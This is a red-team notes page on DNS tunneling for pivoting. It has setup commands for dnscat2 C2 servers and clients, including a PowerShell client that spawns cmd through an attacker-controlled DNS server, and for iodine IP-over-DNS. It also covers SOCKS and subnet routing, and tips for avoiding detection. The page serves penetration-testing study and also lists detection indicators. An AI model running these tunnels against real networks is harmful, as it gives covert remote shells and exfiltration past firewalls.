---
created: 2026-09-05
updated: 2026-10-04
tags:
  - pivoting
---
>[!abstract]+ Scope
>DNS tunneling: why it works, how data is encoded, direct vs. recursive resolution, DNS record payload capacities, authoritative infrastructure setup, `dnscat2` C2 (Linux C and Windows PowerShell clients), IP-over-DNS virtual networking with `iodine`, detection indicators, parameter reference, verification, and cleanup.

## What is DNS tunneling

- DNS tunneling encapsulates arbitrary network traffic inside standard DNS queries and responses. You encode data into subdomain labels (upstream) and DNS record fields (downstream), then relay it through the DNS hierarchy to a server you control.

- This technique targets a specific gap in enterprise perimeter security: corporate firewalls frequently block all outbound TCP (including HTTP/`80`, HTTPS/`443`, SSH/`22`) and outbound UDP, but internal hosts almost always retain the ability to resolve domain names through internal DNS servers. Name resolution is required for basic network functionality, so DNS traffic on port `53` is rarely blocked.

- If DNS queries flow freely, you can use them as a covert data channel — even when every other protocol is filtered.

>[!warning] Bandwidth
>DNS tunneling is slow compared to traditional network protocols. A single DNS query-response pair typically carries only a few hundred bytes. Throughput is measured in kilobytes per second, not megabytes. Sending a `10` MB file might require `100,000+` queries and take upward of 15 minutes at `100` queries per second. Small commands, credentials, and configuration files transfer quickly enough; bulk data exfiltration does not.

## How DNS tunneling works

>[!note] To learn more about how DNS itself works, see [[🛠️ How DNS works]]

### Direct vs. recursive resolution

- There are two primary modes of DNS tunneling:

```
[Mode 1: Direct DNS Queries — requires outbound UDP/53 to the Internet]
Target Pivot ══════════ Outbound UDP/53 ══════════> Attacker DNS Server (203.0.113.11:53)

[Mode 2: Recursive DNS Tunneling — bypasses all outbound firewall restrictions]
Target Pivot ──> Internal AD DNS ──> ISP / Root / TLD Resolvers ──> Attacker Authoritative NS
```

- **Direct mode**: The compromised host sends raw UDP packets on port `53` directly to your public server IP. This only works if the firewall permits external UDP port `53` egress.
- **Recursive mode**: The compromised host sends queries to its normal **internal corporate DNS server** (e.g., an Active Directory domain controller). The corporate resolver finds that the queried domain (`*.tunnel.example.com`) isn't in its local cache and recursively forwards the query through the Internet DNS root and TLD hierarchy until it reaches your **authoritative name server**. Responses follow the reverse path back to the client. The compromised host never communicates directly with an external network, so outbound firewall blocks don't apply.

### Data encoding and flow

- The compromised client encodes data (commands, exfiltrated files, shell I/O) into subdomain labels of the attacker-controlled domain, for example `a7fbc291d.tunnel.example.com`. Common encoding schemes include Base64, Base32, and hex.
- The query is sent to the local DNS resolver, which forwards it (directly or recursively) to the attacker's authoritative server.
- The attacker's server extracts the data from subdomain labels, processes it, and responds with encoded data in a DNS response record field (`TXT`, `CNAME`, `A`, `NULL`, etc.).
- The client receives the DNS response, decodes the payload, and acts on the result.
- Large data is split into small chunks and sent across many queries and responses.

### DNS record types and payload capacity

>[!note] See [[🛠️ How DNS works#DNS message structure]].

- Different record types offer distinct payload capacities and detection profiles:

| Record Type | Tunnel Role | Payload Capacity | Characteristics |
| :--- | :--- | :--- | :--- |
| **`TXT`** | Downstream (server → client) | Up to ~`255` bytes per string (multiples possible up to ~`64` KB with EDNS0) | Most common for C2 responses; carries arbitrary binary or Base64 data. |
| **`A`** | Upstream / downstream | `4` bytes per IP address returned | Low bandwidth (`4` bytes per record), but blends in as standard IPv4 traffic. |
| **`AAAA`** | Downstream | `16` bytes per IPv6 address returned | Four times the throughput of `A` records; rarely inspected in legacy networks. |
| **`CNAME`** | Downstream | Up to `255` bytes (`63` bytes per label) | Returns alias domain names containing encoded data. |
| **`NULL`** | Bidirectional high-speed tunneling | Up to `65,535` bytes (RFC 1035) | Used by `iodine` for raw binary IP-level tunneling without Base32 overhead. |

---

## Infrastructure setup

- To operate recursive DNS tunneling, you need external DNS infrastructure that routes queries for a custom subzone to your server:

```
┌────────────────────────────────────────────────────────┐
│ Domain Registrar (e.g., example.com)                   │
├────────────────────────────────────────────────────────┤
│ A Record:  ns1.example.com ──> 203.0.113.11            │
│ NS Record: tunnel.example.com ──> ns1.example.com      │
└──────────────────────────┬─────────────────────────────┘
                           │
                           v
        [Attacker C2 / DNS Listener: 203.0.113.11]
```

1. **Acquire a domain**: Register a domain with full DNS record control (e.g., `example.com`).
2. **Create an `A` record for your name server**:
   - Host: `ns1.example.com`
   - Value: `203.0.113.11` (public IP of your attack server)
3. **Create a delegation (`NS`) record**:
   - Host / Subdomain: `tunnel.example.com`
   - Value: `ns1.example.com`

- When any resolver on the Internet attempts to query `*.tunnel.example.com`, the root and TLD servers delegate authority to `203.0.113.11`.

---

## Tool 1: `dnscat2` (C2 and port forwarding over DNS)

- [`dnscat2`](https://github.com/iagox86/dnscat2) is an encrypted, bidirectional command-and-control framework that operates over DNS. It sends data inside DNS records (`TXT`, `A`, `AAAA`, `CNAME`, `MX`).
- The tool consists of two components:
	- A **server** written in Ruby that runs on your authoritative DNS server and listens for incoming `dnscat2` queries.
	- A **client** compiled in C (Linux) or executed via PowerShell (Windows) on the compromised host.
- The client sends DNS queries to the local resolver, which forwards them to the authoritative DNS server (your server). The server decodes the payload, processes it, and encodes the response into DNS reply records.

### 1. Server deployment

- Install dependencies and start the `dnscat2` server on your authoritative server:

- Install Ruby and compilation dependencies:

```bash
sudo apt-get update && sudo apt-get install -y ruby-dev git make g++ gcc build-essential
```

- Install Bundler:

```bash
sudo gem install bundler
```

- Clone `dnscat2` and install Ruby gems:

```bash
git clone https://github.com/iagox86/dnscat2.git
```

```bash
cd dnscat2/server && bundle install
```

- Start the server listening on UDP/`53`:

```bash
sudo ruby dnscat2.rb --dns host=0.0.0.0,port=53,domain=tunnel.example.com --no-cache
```

- Upon launch, the server generates a random pre-shared encryption key. You can also set a static key with `--secret=<hex>`. The output includes the secret and the client connection command:

```text
Starting Dnscat2 DNS server on 0.0.0.0:53 [domains = tunnel.example.com]...
Assuming you have an authoritative DNS server, you can run the client with:
  ./dnscat --secret=1f8a5a30d2b74804a39dbdbddd03a8fa tunnel.example.com
```

>[!note] Though it isn't recommended, you can allow unauthenticated connections with `--security=open`.

### 2. Client deployment

#### Linux client (C)

- Clone and compile the C client on the pivot host:

```bash
git clone https://github.com/iagox86/dnscat2.git
```

```bash
cd dnscat2/client && make
```

- Connect in **recursive mode** (queries routed via internal resolver):

```bash
./dnscat --secret=1f8a5a30d2b74804a39dbdbddd03a8fa tunnel.example.com
```

- Connect in **direct mode** (direct UDP/`53` connection, if egress is allowed):

```bash
./dnscat --dns server=203.0.113.11,port=53 --secret=1f8a5a30d2b74804a39dbdbddd03a8fa
```

- `--secret=<secret>` must match the server's generated or configured secret.
- In recursive mode, `tunnel.example.com` is your domain — queries pass through the normal DNS hierarchy.
- In direct mode, you specify the server IP directly with `--dns server=<ip>,port=53`.

#### Windows client (PowerShell)

- On a compromised Windows host, use [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell). Transfer `dnscat2.ps1` to the target, then import and execute it:

- Import the module:

```powershell
Import-Module .\dnscat2.ps1
```

- Connect in **recursive mode** (sends queries to the default domain DNS resolver):

```powershell
Start-Dnscat2 -Domain tunnel.example.com -PreSharedSecret 1f8a5a30d2b74804a39dbdbddd03a8fa -Exec cmd
```

- Connect in **direct mode**:

```powershell
Start-Dnscat2 -DNSserver 203.0.113.11 -Domain tunnel.example.com -PreSharedSecret 1f8a5a30d2b74804a39dbdbddd03a8fa -Exec cmd
```

### 3. Session interaction and port forwarding

- Once the client checks in, the server console opens a new window:

```text
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
dnscat2>
```

#### Interacting with sessions

- View active sessions and windows:

```text
dnscat2> windows
```

- Switch to the client session:

```text
dnscat2> window -i 1
```

- If the client was spawned with `-Exec cmd` (Windows) or as a console session, you'll be in an interactive shell. Press `Ctrl+Z` to return to the `dnscat2` controller prompt.

#### Tunneling ports through DNS

- `dnscat2` can forward local TCP ports through the DNS tunnel to internal network targets:

- From the `dnscat2` prompt, select the active session window and create a local port forward — listen on `127.0.0.1:8080` on the attacker, forward through DNS to the internal target `172.16.5.135:80`:

```text
dnscat2> window -i 1
```

```text
dnscat2 (window 1)> listen 127.0.0.1:8080 172.16.5.135:80
Listening on 127.0.0.1:8080, forwarding to 172.16.5.135:80
```

- You can now point your local browser or `curl` to `http://127.0.0.1:8080` to access the remote internal web server over the DNS tunnel.

---

## Tool 2: `iodine` (full IP-over-DNS VPN)

- While `dnscat2` provides an application-level C2 channel and basic TCP forwarding, **`iodine`** operates at Layer 3: it creates a virtual point-to-point network interface (`tun0`) on both the attacker and pivot hosts and encapsulates raw IP packets inside DNS queries.

```
[Attacker Host]                                                [Target Pivot Host]
┌─────────────────────────┐                                    ┌─────────────────────────┐
│ iodined Server          │                                    │ iodine Client           │
│ IP: 10.0.0.1 (tun0)     │ <══════ Encapsulated IP ═════════> │ IP: 10.0.0.2 (tun0)     │
│ Public: 203.0.113.11    │         Over DNS Queries           │ Direct or via Corp DNS  │
└────────────┬────────────┘                                    └────────────┬────────────┘
             │                                                              │
   Dynamic SSH: ssh -D 9050                                       Direct Access to
   Route Subnet: 172.16.5.0/24                                    Internal Subnets
```

- Because `iodine` provides a real IP interface, you can run any IP protocol (TCP, UDP, ICMP) across the link — SSH, Nmap, `proxychains`, etc.

### 1. Server configuration (`iodined`)

- Install and start `iodined` on your public server:

```bash
sudo apt-get install -y iodine
```

- Start the server (syntax: `iodined -f -c -P <password> <tunnel_ip> <top_domain>`):

```bash
sudo iodined -f -c -P P@ssw0rd123! 10.0.0.1 tunnel.example.com
```

- `-f`: Run in foreground for debugging.
- `-c`: Disable IP checking on incoming connections (necessary when requests arrive through varying recursive resolvers).
- `-P P@ssw0rd123!`: Pre-shared authentication password.
- `10.0.0.1`: IP assigned to the server's `tun0` interface. Client IPs are allocated from this `/27` subnet (e.g., `10.0.0.2`).
- `tunnel.example.com`: The delegated domain.

### 2. Client connection (`iodine`)

- On the compromised Linux pivot (requires root privileges to create the TUN interface):

```bash
sudo apt-get install -y iodine
```

- Connect to the tunnel (syntax: `iodine -f -P <password> <nameserver_ip_or_domain> <top_domain>`):

```bash
sudo iodine -f -P P@ssw0rd123! 192.168.1.1 tunnel.example.com
```

- `192.168.1.1`: The internal corporate DNS resolver (queries are recursively forwarded).
- `tunnel.example.com`: The delegated domain.

- Upon successful handshake:

```text
Opened tun0
Version ok, both using protocol v0x00000502. You are user #0
Setting IP of tun0 to 10.0.0.2
Setting MTU of tun0 to 1130
Server tunnel IP is 10.0.0.1
Connection setup complete, transmitting data.
```

### 3. Pivoting over the `iodine` TUN interface

#### Option A: SOCKS proxy over SSH

- Run dynamic SSH forwarding over the tunnel IP (`10.0.0.2`):

```bash
ssh -D 9050 -N -f root@10.0.0.2
```

- Access internal networks via ProxyChains:

```bash
proxychains nmap -sT -Pn 172.16.5.0/24
```

#### Option B: Direct subnet routing

- Enable kernel routing on the pivot and add a static route on the attacker host:

- On the pivot host (enable IP forwarding):

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

```bash
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

- On the attacker host (route internal subnet through tunnel client):

```bash
sudo ip route add 172.16.5.0/24 via 10.0.0.2
```

---

## Detection and telemetry considerations

- DNS tunneling produces distinct network indicators that SOC teams monitor:

1. **High query volume and frequency**: DNS queries per second spike dramatically during active file transfers or interactive sessions.
2. **Subdomain length and entropy**: Queries use encoded subdomains (e.g., `a7fbc291d.tunnel.example.com`) that exhibit high Shannon entropy and approach the maximum `63`-character label limit.
3. **Abnormal record distributions**: High ratios of `TXT`, `NULL`, or `CNAME` queries compared to standard web browsing, which is dominated by `A` and `AAAA` lookups.
4. **`NXDOMAIN` response rates**: Mismatched or malformed queries often generate abnormal volumes of `NXDOMAIN` (Non-Existent Domain) responses on internal DNS servers.

- To reduce detection risk during assessments:
	- Increase packet interval and throttle throughput.
	- Prefer `dnscat2` for intermittent C2 heartbeats rather than high-volume data exfiltration.
	- When egress firewalls permit any other protocol (HTTP, HTTPS, ICMP), prioritize those over DNS tunneling.

---

## Parameter reference

### `dnscat2` server options

| Option | Default | Description |
| :--- | :--- | :--- |
| `--dns host=<ip>,port=<port>,domain=<fqdn>` | Required | Configures DNS listening address, port (typically `53`), and authoritative domain. |
| `--secret=<string>` | Auto-generated | Sets the pre-shared secret for client authentication and encryption. |
| `--no-cache` | Enabled | Prevents caching upstream responses to ensure consistent real-time delivery. |
| `--security=open` | Strict | Disables mandatory encryption and pre-shared secret verification. |

### `iodined` server options

| Option | Default | Description |
| :--- | :--- | :--- |
| `-f` | Background | Runs the daemon in the foreground. |
| `-c` | Disabled | Disables client IP address verification on incoming queries. |
| `-P <secret>` | None | Shared authentication password between server and client. |
| `-m <mtu>` | Auto (`1130`) | Configures the maximum transmission unit on the `tun0` interface. |
| `-l <ip>` | `0.0.0.0` | Local IP address for the server listener. |

---

>[!tip]+ Verification
>1. Verify DNS traffic on the attacker server using `tcpdump`:
>   ```bash
>   sudo tcpdump -n -i any udp port 53
>   ```
>2. Verify active `dnscat2` windows:
>   ```text
>   dnscat2> windows
>   ```
>3. Verify `iodine` point-to-point interface:
>   ```bash
>   ip addr show tun0
>   ping -c 2 10.0.0.1
>   ```

>[!tip]+ Cleanup
>1. Terminate `dnscat2` sessions from the server console:
>   ```text
>   dnscat2> kill 1
>   dnscat2> quit
>   ```
>2. On the pivot host, terminate the client process:
>   ```bash
>   killall dnscat iodine
>   ```
>3. On the attacker host, stop `iodined` and destroy the virtual interface:
>   ```bash
>   sudo killall iodined
>   sudo ip link delete tun0 2>/dev/null
>   ```

## References and further reading

- [`dnscat2 GitHub Repository — iagox86`](https://github.com/iagox86/dnscat2)
- [`dnscat2-powershell — lukebaggett`](https://github.com/lukebaggett/dnscat2-powershell)
- [`iodine: IP-over-DNS Tunneling — Official Site`](https://code.kryo.se/iodine/)
- [`RFC 1035: Domain Names - Implementation and Specification — IETF`](https://datatracker.ietf.org/doc/html/rfc1035)
- [`Detecting DNS Tunneling — SANS Institute Reading Room`](https://www.sans.org/white-papers/34370/)
- [`DNS tunneling, A Red Teamer's guide to pivoting — Artem Kondratenko`](https://artkond.com/2017/03/23/pivoting-guide/#dns-tunneling)
- [`DNS Tunneling — eln0ty`](https://eln0ty.github.io/blog/DNS-Tunneling/)
- [`DNScat2: Application Layer C&C — Hacking Articles`](https://www.hackingarticles.in/dnscat2-application-layer-cc/)
- [`Dnscat — carlesreid1`](https://charlesreid1.com/wiki/Dnscat)